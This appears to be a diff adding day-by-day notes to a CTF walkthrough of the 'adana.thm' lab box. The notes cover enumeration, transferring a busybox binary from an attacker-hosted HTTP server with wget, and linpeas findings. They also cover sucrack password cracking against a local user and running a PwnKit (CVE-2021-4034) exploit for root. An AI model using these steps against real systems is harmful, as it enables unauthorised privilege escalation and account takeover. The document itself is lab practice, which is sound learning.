@@ -9,6 +9,7 @@ We will tend to think differently in this room.
 In fact, we will understand that what we see is not what we think, and if you go beyond the purpose, you will disappear in the room, fall into a rabbit hole.﻿
 ```
 
+# Day 1
 When trying to navigate to the wp-admin page in firefox we are redirected to
 this page: http://adana.thm/wp-login.php?redirect_to=http%3A%2F%2F10.10.32.11%2Fwp-admin%2F&reauth=1
 
@@ -52,6 +53,7 @@ wp-includes             [Status: 301, Size: 312, Words: 20, Lines: 10, Duration:
 :: Progress: [20476/20476] :: Job [1/1] :: 587 req/sec :: Duration: [0:00:52] :: Errors: 0 ::
 ```
 
+The answer to the secret directory is: /announcements
 If we go to http://adana.thm/announcements/, we can see two files:
 [IMG]	austrailian-bulldog-ant.jpg	2021-01-11 11:51 	58K
 [TXT]	wordlist.txt	2021-01-11 13:48 	394K
@@ -248,6 +250,7 @@ See if there are any hidden directories on the ftp-server
 Enumerate subdomains.
 
 It's getting late, let's table this for another day.
+# Day 2
 
 Circling back to the ftp-server. If we ```ls -la``` we find some additional
 interesting directories 
@@ -450,3 +453,164 @@ And we find the webflag:
 ```
 Let's see if we also can find the secret directory the room is asking for, but
 that, as well as the priv esc is a thing for tomorrow.
+
+# Day 3
+Poking around a bit in the system, inside /var/crash we find a file owned by whoopsie:
+```
+www-data@ubuntu:/var/crash$ ls -la
+total 8
+drwxrwsrwt  2 root whoopsie 4096 Feb 23  2021 .
+drwxr-xr-x 14 root root     4096 Jan 12  2021 ..
+```
+
+Info on the whoopsie user:
+```
+www-data@ubuntu:/var$ cat /etc/passwd|grep whoopsie
+whoopsie:x:114:118::/nonexistent:/bin/false
+```
+
+According to https://ubuntu.com/security/notices/USN-4170-1, there are a number
+of CVEs related to whoopsie. One of them (CVE-2019-11476) could cause code-execution,
+for versions before 0.2.52.5ubuntu0.1, 0.2.62ubuntu0.1, 0.2.64ubuntu0.1, 0.2.66.
+```
+$ apt show whoopsie
+Version: 0.2.62ubuntu0.6
+```
+
+Unfortunately, the version is too recent. So let's do some more prodding.
+
+Let's run linpeas.sh and see what it reports. We can't use find, so the output
+may be a bit hampepered. Although, we can download the busybox-implementation of
+find. Since it is a static binary, it will run as long it is the correct arch.
+
+The URL:
+https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/
+
+On our attack machine, we download the busybox_FIND binary. In order to transfer
+it to the target, we can start a http-server using python (in the same directory
+as busybox_FIND:
+```
+$ python -m http.server
+```
+
+And on the target:
+```
+www-data@ubuntu:/tmp$ mkdir bin
+www-data@ubuntu: cd bin/
+www-data@ubuntu:/tmp/bin$ wget http://10.14.21.85:8000/busybox_FIND -O find
+www-data@ubuntu:/tmp/bin$ chmod +x find # Make it executable
+www-data@ubuntu:/tmp$ export PATH=/tmp/bin:$PATH # Add /tmp/bin to the PATH
+```
+
+And we can now run find:
+```
+www-data@ubuntu:/tmp$ find --help
+Usage: find [-HL] [PATH]... [OPTIONS] [ACTIONS]
+
+Search for files and perform actions on them.
+First failed action stops processing of current file.
+Defaults: PATH is current directory, action is '-print'
+...
+```
+
+
+```
+
+We have a probable exposure to CVE-2021-4034. I did try it out, and I indeed
+was able to get a root shell. However, its a boring way to do it, so I'm going
+to see if I can find the intended way to escalate. Because this is about
+learning, not winning.
+```
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+```
+
+A gpg-agent running:
+```
+www-data  8070  0.0  0.0  98844   768 ?        Ss   18:16   0:00 gpg-agent --homedir /var/www/.gnupg --use-standard-socket --daemon
+```
+
+Network service from relative path:
+```
+/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
+```
+
+We have some active ports:
+```
+Active Ports
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN # IPP (Internet printing protocol)
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN #mysql
+tcp6       0      0 :::21                   :::*                    LISTEN      -
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+```
+
+hakanbey is a membed of the lxd group, so we might be able to escalate to root
+through that vector once we have gotten a shell as them:
+```
+uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
+```
+
+mysql could be an opening:
+```
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user          = mysql
+Found readable /etc/mysql/my.cnf
+```
+
+Check /etc/apache2
+
+Some interesting executables
+```
+-r-srwx--- 1 root hakanbey 13K Jan 14  2021 /usr/bin/binary (Unknown SUID binary!)
+You can write SUID file: /usr/sbin/exim4
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+```
+
+I think that /usr/bin/binary can be used to priv esc from hakanbey to root.
+
+apache2 related info:
+```
+drwxr-xr-x 2 root root 4096 Jan 15  2021 /etc/apache2/sites-enabled
+drwxr-xr-x 2 root root 4096 Jan 15  2021 /etc/apache2/sites-enabled
+-rw-r--r-- 1 root root 1340 Jan 15  2021 /etc/apache2/sites-enabled/000-default1.conf
+<VirtualHost *:80>
+        ServerName subdomain.adana.thm
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/subdomain
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+lrwxrwxrwx 1 root root 35 Jan 10  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+```
+
+Append "adana123" to the passwords in the list:
+```
+$ cat wordlist.txt | awk '{print "123adana" $0}' > 123wordlist.txt
+```
+
+And then we can go ahead and use ```sucrack``` to crack the password:
+```
+www-data@ubuntu:/tmp$ sucrack -u hakanbey 123wordlist.txt
+```
+
+This took too long, so instead I used CVE-2021-4034 to become root, and then
+su:d into hakanbey.
+```
+www-data@ubuntu:/tmp/CVE-2021-4034-main$ ./cve-2021-4034
+# su hakanbey
+hakanbey@ubuntu:/tmp/CVE-2021-4034-main$
+```
+
+The next step is to find out what /usr/bin/binary does, but that is a task for
+next time.
